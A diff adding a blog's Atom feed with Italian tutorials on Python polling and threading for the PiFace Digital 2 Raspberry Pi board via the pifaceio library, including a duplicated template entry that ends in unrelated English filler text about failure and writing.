+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Thread 4 terminated'&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt; 
+
+
+&lt;span class=&quot;c1&quot;&gt;#---- Shared variable initialiting
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;myVarSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;#---- Starting threads -----
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'f1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'f2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'f3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ledShow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hold down the buttons 0 and 2 to terminate the program'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;func4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Come si può vedere dal codice, è stata definita una classe myThread per la creazione dei threads. Quando un nuovo oggetto della classe myThread viene istanziato e lanciato, viene eseguita una specifica funzione in base al parametro name passato al costruttore. Questo approccio ha consentito di definire una singola classe dinamica per la creazione dei thread. Per poter condividere una variabile tra i vari thread in esecuzione, è necessario creare un oggetto e inizializzare il valore della variabile in esso contenuta solo dopo la definizione delle varie ‘funzioni thread’. Il quarto thread, che corrisponde alla funzione ledShow, effettua polling sull’input 3 e una volta che viene trovato attivo, controlla che per i prossimi 2 secondi resti in quello stato; in caso positivo entra nel blocco if successivo e accende tutti i led in sequenza.&lt;/p&gt;
+
+&lt;p&gt;Sulla base del programma appena visto potrete creare applicazioni avanzate e personalizzate per il vostro PiFace Digital, dando spazio alla creatività. I thread visti in questo esempio eseguono azioni molto banali, ma potrebbero eseguire operazioni molto più interessanti come l’invio di un’email, lo scatto di una foto da una webcam, accendere il sistema di riscaldamento di casa, ecc. Dunque non dovete fare altro che dare spazio all’immaginazione e creare il vostro sistema IoT!&lt;/p&gt;
+
+&lt;p&gt;Sulla pagina ufficiale di PiFace potete trovare moltissime idee e guide su come realizzarle (in lingua inglese).&lt;/p&gt;</content><author><name>Giovanni De Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="IoT" /><category term="piface" /><category term="piface digital 2" /><category term="pifaceio" /><category term="Programmazione" /><category term="Python" /><category term="raspberry" /><category term="raspberrypi" /><summary type="html"></summary></entry><entry><title type="html">PiFace Digital 2 - Una libreria Python alternativa e più performante</title><link href="http://localhost:4000/PiFaceIO-PiFace-Library" rel="alternate" type="text/html" title="PiFace Digital 2 - Una libreria Python alternativa e più performante" /><published>2016-08-22T00:00:00+02:00</published><updated>2016-08-22T00:00:00+02:00</updated><id>http://localhost:4000/PiFaceIO-PiFace-Library</id><content type="html" xml:base="http://localhost:4000/PiFaceIO-PiFace-Library">&lt;figure&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/pifacedigital2.jpg&quot; /&gt;  
+&lt;/figure&gt;
+&lt;p&gt;Un saluto a tutti i lettori.&lt;/p&gt;
+
+&lt;p&gt;Alcune settimane fa ho avuto tra le mani un Raspberry Pi con modulo PiFace Digital 2, una scheda aggiuntiva collegata tramite interfaccia GPIO che consente al Raspberry di comunicare con relè, interruttori, input e output digitali. Il modulo PiFace Digital è facilmente programmabile in Python e consente ad esempio di collegare sensori, motori e luci che potranno essere controllati direttamente dal Raspberry. Dunque, se volete cimentarvi nel mondo IoT (Internet of Things), questo modulo è davvero interessante.&lt;/p&gt;
+
+&lt;p&gt;La documentazione ufficiale, contenente anche dei brevissimi esempi di programmazione in Python, è disponibile qui.&lt;/p&gt;
+
+&lt;p&gt;Gli sviluppatori del modulo PiFace Digital, hanno reso disponibile una libreria ufficiale in Python per poter mettere in comunicazione le nostre applicazioni con il modulo PiFace Digital. La libreria in questione si chiama pifacedigitalio, ed è sufficiente per gran parte degli scopi.&lt;/p&gt;
+
+&lt;p&gt;In molte delle applicazioni tuttavia, potrebbe essere necessario ricorrere a delle tecniche di polling, ovvero dei controlli ciclici sulle porte di input, in attesa di un cambiamento del loro stato. Purtroppo, per questo tipo di applicazioni la libreria ufficiale si è rivelata inefficiente, a causa dei tempi di lettura delle porte non proprio ottimali. Questo potrebbe portare, come nel mio caso, a dei comportamenti dell’applicazione che non sempre sono quelli desiderati, in particolar modo nel caso di applicazioni multithread (che vedremo come realizzare in un prossimo articolo).&lt;/p&gt;
+
+&lt;p&gt;Per ovviare a questo problema ho eseguito varie ricerche in rete prima di poter giungere alla soluzione, ovvero una diversa libreria, non ufficiale, creata appositamente per la realizzazione di polled applications. La libreria, realizzata dall’australiano Mark Blakeney, si chiama pifaceio, ed è disponibile su GitHub al seguente link: &lt;a href=&quot;https://github.com/bulletmark/pifaceio&quot;&gt;https://github.com/bulletmark/pifaceio&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;La libreria pifaceio offre quattro metodi principali che sono:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;b&gt;read()&lt;/b&gt;: Restituisce un byte che corrisponde allo stato di tutte le 8 porte di input.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;write()&lt;/b&gt;: Scrive un byte, passato opzionalmente come parametro, aggiornando lo stato delle 8 porte di output. Se non si passa nessun byte come parametro, la funzione aggiorna le porte di output con i valori impostati in precedenza della  chiamata alla funzione write_pin(), descritta in seguito.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;read_pin(pin)&lt;/b&gt;: Chiamato dopo il metodo read(), restituisce lo stato aggiornato della specifica porta di input passata come parametro.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;write_pin(pin, state)&lt;/b&gt;: Prende come parametri di input il numero di una porta di output e uno stato per essa. Per poter aggiornare effettivamente le porte è necessaria successivamente una chiamata al metodo write()&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Di seguito è riportato un banalissimo esempio di una applicazione che tramite polling, alla pressione del pulsante 0 sulla scheda PiFace (collegato in parallelo alla porta di input 0), attiva la porta di output corrispondente al numero di volte che il tasto è stato premuto, fino ad un massimo di 7. Quando una porta di output è attiva, sulla scheda PiFace vedrete accendersi il led corrispondente. Per comodità, ho preferito definire all’interno della mia applicazione le funzioni read_pin() e write_pin(), le quali ogni volta richiamano automaticamente anche i metodi read() e write() della libreria pifaceio, in modo da evitare di doverli richiamare manualmente ogni volta.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pifaceio&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pifaceio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PiFace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In una prossima guida mostrerò come realizzare un’applicazione che effettua polling contemporaneamente su differenti input per effettuare diverse operazioni.&lt;/p&gt;</content><author><name>Giovanni De Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="IoT" /><category term="piface" /><category term="piface digital 2" /><category term="pifaceio" /><category term="Programmazione" /><category term="Python" /><category term="raspberry" /><category term="raspberrypi" /><summary type="html"></summary></entry><entry><title type="html">PiFace Digital 2 - Una libreria Python alternativa e più performante</title><link href="http://localhost:4000/base_template" rel="alternate" type="text/html" title="PiFace Digital 2 - Una libreria Python alternativa e più performante" /><published>2016-08-22T00:00:00+02:00</published><updated>2016-08-22T00:00:00+02:00</updated><id>http://localhost:4000/base_template</id><content type="html" xml:base="http://localhost:4000/base_template">&lt;figure&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/pifacedigital2.jpg&quot; /&gt;  
+&lt;/figure&gt;
+&lt;p&gt;Un saluto a tutti i lettori.&lt;/p&gt;
+
+&lt;p&gt;Alcune settimane fa ho avuto tra le mani un Raspberry Pi con modulo PiFace Digital 2, una scheda aggiuntiva collegata tramite interfaccia GPIO che consente al Raspberry di comunicare con relè, interruttori, input e output digitali. Il modulo PiFace Digital è facilmente programmabile in Python e consente ad esempio di collegare sensori, motori e luci che potranno essere controllati direttamente dal Raspberry. Dunque, se volete cimentarvi nel mondo IoT (Internet of Things), questo modulo è davvero interessante.&lt;/p&gt;
+
+&lt;p&gt;La documentazione ufficiale, contenente anche dei brevissimi esempi di programmazione in Python, è disponibile qui.&lt;/p&gt;
+
+&lt;p&gt;Gli sviluppatori del modulo PiFace Digital, hanno reso disponibile una libreria ufficiale in Python per poter mettere in comunicazione le nostre applicazioni con il modulo PiFace Digital. La libreria in questione si chiama pifacedigitalio, ed è sufficiente per gran parte degli scopi.&lt;/p&gt;
+
+&lt;p&gt;In molte delle applicazioni tuttavia, potrebbe essere necessario ricorrere a delle tecniche di polling, ovvero dei controlli ciclici sulle porte di input, in attesa di un cambiamento del loro stato. Purtroppo, per questo tipo di applicazioni la libreria ufficiale si è rivelata inefficiente, a causa dei tempi di lettura delle porte non proprio ottimali. Questo potrebbe portare, come nel mio caso, a dei comportamenti dell’applicazione che non sempre sono quelli desiderati, in particolar modo nel caso di applicazioni multithread (che vedremo come realizzare in un prossimo articolo).&lt;/p&gt;
+
+&lt;p&gt;Per ovviare a questo problema ho eseguito varie ricerche in rete prima di poter giungere alla soluzione, ovvero una diversa libreria, non ufficiale, creata appositamente per la realizzazione di polled applications. La libreria, realizzata dall’australiano Mark Blakeney, si chiama pifaceio, ed è disponibile su GitHub al seguente link: &lt;a href=&quot;https://github.com/bulletmark/pifaceio&quot;&gt;https://github.com/bulletmark/pifaceio&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;La libreria pifaceio offre quattro metodi principali che sono:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;b&gt;read()&lt;/b&gt;: Restituisce un byte che corrisponde allo stato di tutte le 8 porte di input.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;write()&lt;/b&gt;: Scrive un byte, passato opzionalmente come parametro, aggiornando lo stato delle 8 porte di output. Se non si passa nessun byte come parametro, la funzione aggiorna le porte di output con i valori impostati in precedenza della  chiamata alla funzione write_pin(), descritta in seguito.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;read_pin(pin)&lt;/b&gt;: Chiamato dopo il metodo read(), restituisce lo stato aggiornato della specifica porta di input passata come parametro.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;write_pin(pin, state)&lt;/b&gt;: Prende come parametri di input il numero di una porta di output e uno stato per essa. Per poter aggiornare effettivamente le porte è necessaria successivamente una chiamata al metodo write()&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Di seguito è riportato un banalissimo esempio di una applicazione che tramite polling, alla pressione del pulsante 0 sulla scheda PiFace (collegato in parallelo alla porta di input 0), attiva la porta di output corrispondente al numero di volte che il tasto è stato premuto, fino ad un massimo di 7. Quando una porta di output è attiva, sulla scheda PiFace vedrete accendersi il led corrispondente. Per comodità, ho preferito definire all’interno della mia applicazione le funzioni read_pin() e write_pin(), le quali ogni volta richiamano automaticamente anche i metodi read() e write() della libreria pifaceio, in modo da evitare di doverli richiamare manualmente ogni volta.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pifaceio&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pifaceio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PiFace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In una prossima guida mostrerò come realizzare un’applicazione che effettua polling contemporaneamente su differenti input per effettuare diverse operazioni.&lt;/p&gt;
+
+&lt;h3 id=&quot;failure-is-important&quot;&gt;&lt;b&gt;Failure is Important&lt;/b&gt;&lt;/h3&gt;
+
+&lt;p&gt;Last month, I had the idea to write an article each day for the month. How long did that last? Only five days. No matter how you look at it, that is failure. And it’s not just about the fact I didn’t manage to beat the challenge, it’s more about the principle of the matter. The fact that I failed to keep a promise to myself and others. Why did I let this happen? I think more broadly, it needs to be asked: Why do people do this — so often — in general?&lt;/p&gt;
+
+&lt;p&gt;Before I get into that, though, let’s take a look at the bright side of the situation. I managed to write two longform articles that I’m proud of:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://writingcooperative.com/my-writing-process-4868f986f97f&quot;&gt;https://writingcooperative.com/my-writing-process-4868f986f97f&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The only reason those posts got written was because, for the first time, I had to churn things out. Challenging myself to write each day for a month made me think long-term and plan out a schedule. It made me think of different topics to explore and ideas to experiment with. In the past, I’ve truthfully just written when inspiration struck.&lt;/p&gt;
+
+&lt;p&gt;Not only that, but I joined the &lt;a href=&quot;https://medium.com/creators&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Medium Partner Program&lt;/a&gt; last month as well, which means that I got paid for these stories. It’s the first time I’ve ever been paid for my writing. And seeing that was a wake-up call for me. I was shown that if I put effort into my work and plan things out, then I could make serious side-hustle out of Medium.&lt;/p&gt;
+
+&lt;figure class=&quot;wp-caption&quot;&gt;
+
+&lt;img data-width=&quot;3000&quot; data-height=&quot;2400&quot; src=&quot;https://cdn-images-1.medium.com/max/2560/1*UKfnx1Hgk5RH8DdJoizv7A.jpeg&quot; /&gt; &lt;figcaption class=&quot;wp-caption-text&quot;&gt;&lt;b&gt;Interior View of Drafting Room in ERB&lt;/b&gt; | &lt;a href=&quot;https://commons.wikimedia.org/wiki/File:Interior_View_of_Drafting_Room_in_ERB_-_GPN-2000-001447.jpg&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Source&lt;/a&gt;&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;figure&gt;
+
